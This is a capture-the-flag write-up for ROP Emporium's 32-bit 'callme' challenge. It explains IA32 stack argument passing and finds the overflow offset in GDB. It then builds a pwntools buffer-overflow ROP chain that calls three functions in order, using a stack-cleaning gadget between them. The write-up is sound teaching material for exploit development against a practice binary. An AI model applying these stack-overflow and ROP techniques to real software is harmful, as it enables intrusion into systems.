# CALLME (x86_32)

[callme](https://ropemporium.com/challenge/callme.html)

The 32-bit version of the `callme` challenge is quite similar to the 64-bit version. The key difference is how arguments are passed into functions.

In AMD64 Linux, the first 6 integer arguments are passed into registers while the rest are pushed onto the stack. This is not the case in IA32, where all arguments are pushed onto the stack. For example, the assembly snippet below calls `calloc()` with `4` as the first argument and `8` as the second argument.

```assembly
    push 0x8 ; second argument
    push 0x4 ; first argument
    call calloc@PLT
```

As you can see, the second argument is pushed before the first argument, which causes the memory address of the first argument to be lower on the stack.

| Address | Value | Remarks |
| - | - | - |
| 0xffffffa8 | 0x8 | Second argument |
| 0xffffffa4 | 0x4 | First argument |
| 0xffffffa0 | 0x400100 | Saved EIP |

Thus, to call `callme_one()`, your ROP chain should include something like this:

```python
from pwn import *
...
ARG0 = 0xdeadbeef
ARG1 = 0xcafebabe
ARG2 = 0xd00df00d
ARGS_COMBINED = p32(ARG0) + p32(ARG1) + p32(ARG2)

attack = ... # buffer garbage
attack += p32(exe.symbols["callme_one"]) # address of callme_one
attack += b"A"*4 # overwrite saved eip
attack += ARGS_COMBINED # arguments
io.sendline(attack)
...
```

Now that we have understood the IA32 calling convention, we must now calculate how many bytes we must write before we overwrite the saved `eip`.

```
$ gdb ./callme32
...
> disassemble pwnme
...
   0x08048732 <+69>:    push   0x0
   0x08048734 <+71>:    call   0x80484c0 <read@plt>
   0x08048739 <+76>:    add    esp,0x10
   0x0804873c <+79>:    sub    esp,0xc
...
> break *0x08048739
Breakpoint 1 at 0x8048739
> run
...
callme by ROP Emporium
x86

Hope you read the instructions...

> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab
...
> x/24wx $ebp
0xffffca28:     0x6161616b      0x6161616c      0x6161616d      0x6161616e
0xffffca38:     0x6161616f      0x61616170      0x61616171      0x61616172
...
```

The long sequence of letters that was passed as input comes from `pwn cyclic 128`. When we run the GDB command `x/24wx $ebp`, we can see the first 96 bytes on the stack starting from the memory address stored in `ebp`. If you remember how a function works in assembly, then you'd know that the value stored at `ebp` is the value that `ebp` held before the function was called while the value after that is the return address (which is what we are after). From the output, we know that the value in the saved return address (`eip`) is `0x6161616c`. Since the first double-word in our buffer is `0x61616161`, it means there are 11 double-words (or 44 bytes) between the start of the buffer and the saved `eip`. We can now use this information to fill in the first part of our attack

```python
from pwn import *
...
ARG0 = 0xdeadbeef
ARG1 = 0xcafebabe
ARG2 = 0xd00df00d
ARGS_COMBINED = p32(ARG0) + p32(ARG1) + p32(ARG2)

attack = b"A"*44 # buffer garbage
attack += p32(exe.symbols["callme_one"]) # address of callme_one
attack += b"A"*4 # overwrite saved eip
attack += ARGS_COMBINED # arguments
io.sendline(attack)
...
```

If we were only had to call just `callme_one()`, we would be done. However, the challenge require us to run `callme_one()`, `callme_two()`, `callme_three()` in that order with the same arguments. This means that when each function gets called, the 5th to 16th bytes from the saved `ebp` must correspond to the 3 arguments specified by the author.

From the called function (like `callme_one()`), the stack must look like this:

| Address | Value | Remarks |
| - | - | - |
| ebp+0x10 | 0xd00df00d | 3rd argument |
| ebp+0xc | 0xcafebabe | 2nd argument |
| ebp+0x8 | 0xdeadbeef | 1st argument |
| ebp+0x4 | b"AAAA" | overwritten saved EIP |
| ebp | ........ | saved EBP from caller |

Luckily, this arrangement still gives us alot of freedom to smuggle a ROP chain into. See the overwritten saved `eip` at `ebp+0x4`? We can use that to call another function or ROP gadget once the called function returns.

You may think that to call `callme_two()` after `callme_one()`, you can simply do this:

```python
from pwn import *
...
ARG0 = 0xdeadbeef
ARG1 = 0xcafebabe
ARG2 = 0xd00df00d
ARGS_COMBINED = p32(ARG0) + p32(ARG1) + p32(ARG2)

attack = b"A"*44 # buffer garbage
attack += p32(exe.symbols["callme_one"]) # address of callme_one
attack += p32(exe.symbols["callme_two"]) # address of callme_two
attack += b"A"*4 # overwrite saved eip
attack += ARGS_COMBINED # arguments
io.sendline(attack)
...
```

Sure the stack from `callme_one()` perspective may still be correct. However, when the function returns to `callme_two()`, you'll find that the arguments on the stack are now offset by 4 bytes:

| Address | Value | Remarks |
| - | - | - |
| ebp+0x10 | ???????? | 3rd argument |
| ebp+0xc | 0xd00df00d | 2nd argument |
| ebp+0x8 | 0xcafebabe | 1st argument |
| ebp+0x4 | 0xdeadbeef | overwritten saved EIP |
| ebp | ........ | saved EBP from caller |

This is clearly not what we want. And we also can't really *push* the stack back up to rectify the offset. Instead we can just pop those 12 broken bytes from the stack to arrive at a new portion of the stack that we know is good. In table form:

| Address | Value | Remarks |
| - | - | - |
| ebp+0x40 | 0xd00df00d | 3rd argument |
| ebp+0x3c | 0xcafebabe | 2nd argument |
| ebp+0x38 | 0xdeadbeef | 1st argument |
| ebp+0x34 | b"AAAA" | overwritten saved EIP |
| ebp+0x30 | `callme_three()` | Address of `callme_three()` |
| ebp+0x2c | 0xd00df00d | 3rd argument |
| ebp+0x20 | 0xcafebabe | 2nd argument |
| ebp+0x1c | 0xdeadbeef | 1st argument |
| ebp+0x18 | rop_gadget | ROP gadget to pop 12 bytes above it |
| ebp+0x14 | `callme_two()` | Address of `callme_two()` |
| ebp+0x10 | 0xd00df00d | 3rd argument |
| ebp+0xc | 0xcafebabe | 2nd argument |
| ebp+0x8 | 0xdeadbeef | 1st argument |
| ebp+0x4 | rop_gadget | ROP gadget to pop 12 bytes above it |
| ebp | ........ | saved EBP from caller |

Since an ROP gadget usually has a `ret` instruction, when the ROP gadget has been executed, the next item on the stack will be the address of the next function. The `ret` instruction will then pop that address into `eip`, where the program then continues on from. After the first ROP gadget, `callme_two()` should be running, and the stack should look like this:

| Address | Value | Remarks |
| - | - | - |
| ebp+0x24 | 0xd00df00d | 3rd argument |
| ebp+0x20 | 0xcafebabe | 2nd argument |
| ebp+0x1c | 0xdeadbeef | 1st argument |
| ebp+0x18 | b"AAAA" | overwritten saved EIP |
| ebp+0x14 | `callme_three()` | Address of `callme_three()` |
| ebp+0x10 | 0xd00df00d | 3rd argument |
| ebp+0xc | 0xcafebabe | 2nd argument |
| ebp+0x8 | 0xdeadbeef | 1st argument |
| ebp+0x4 | rop_gadget | ROP gadget to pop 12 bytes above it |
| ebp | ........ | saved EBP from caller |

With the core concepts laid out, we can look for a ROP gadget that pops 12 bytes from the stack. The gadget below is perfect for the task. The `add esp, 8` instruction gets rid of the first 8 bytes while the `pop ebx` discards the next 4 bytes.

```bash
$ ROPgadget --binary ./callme32
...
0x080484aa : add esp, 8 ; pop ebx ; ret
...
```

This should be enough to formulate our attack:

```python
from pwn import *
...
ARG0 = 0xdeadbeef
ARG1 = 0xcafebabe
ARG2 = 0xd00df00d
ARGS_COMBINED = p32(ARG0) + p32(ARG1) + p32(ARG2)

ADDESP8_POPEBX_RET = p32(0x80484aa) # add esp, 8; pop ebx; ret

attack = b"A"*44 # buffer garbage
attack += p32(exe.symbols["callme_one"]) + ADDESP8_POPEBX_RET + ARGS_COMBINED
attack += p32(exe.symbols["callme_two"]) + ADDESP8_POPEBX_RET + ARGS_COMBINED
attack += p32(exe.symbols["callme_three"]) + b"AAAA" + ARGS_COMBINED
io.sendline(attack)
...
```